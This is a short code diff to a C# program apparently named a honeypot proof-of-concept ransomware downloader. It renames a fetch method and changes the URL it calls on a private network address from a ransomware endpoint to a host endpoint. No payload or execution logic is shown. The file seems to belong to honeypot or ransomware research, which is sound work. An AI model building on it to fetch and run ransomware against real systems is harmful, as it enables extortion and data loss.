@@ -15,10 +15,10 @@ namespace HoneyPot5POCRansomwareDownloader
         static string RANSOMWAREFILEPATH = "";
         private static readonly HttpClient client = new HttpClient();
 
-        public static void getPoCRansomware()
+        public static void getPoCHost()
         {
 
-            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/gethp5ransomware").Result;
+            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/gethp5host").Result;
             NAMEONTEST = findNAMEONTEST(responseString);
             Console.WriteLine(NAMEONTEST);
 
